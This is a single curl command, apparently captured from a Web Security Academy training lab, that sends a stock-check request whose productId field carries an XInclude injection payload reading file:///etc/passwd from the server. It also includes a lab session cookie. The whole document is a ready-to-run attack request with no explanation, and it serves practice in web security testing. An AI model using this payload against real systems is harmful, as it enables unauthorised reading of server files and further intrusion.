curl 'https://acb41f441ee6afbe80c9a1c200cc0052.web-security-academy.net/product/stock' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Accept: */*' \
  -H 'Origin: https://acb41f441ee6afbe80c9a1c200cc0052.web-security-academy.net' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://acb41f441ee6afbe80c9a1c200cc0052.web-security-academy.net/product?productId=1' \
  -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7' \
  -H 'Cookie: session=AHOnM4UMATeQXxWg3AlnjNoNG4jDSfFW' \
  --data-raw 'productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=2' \
  --compressed
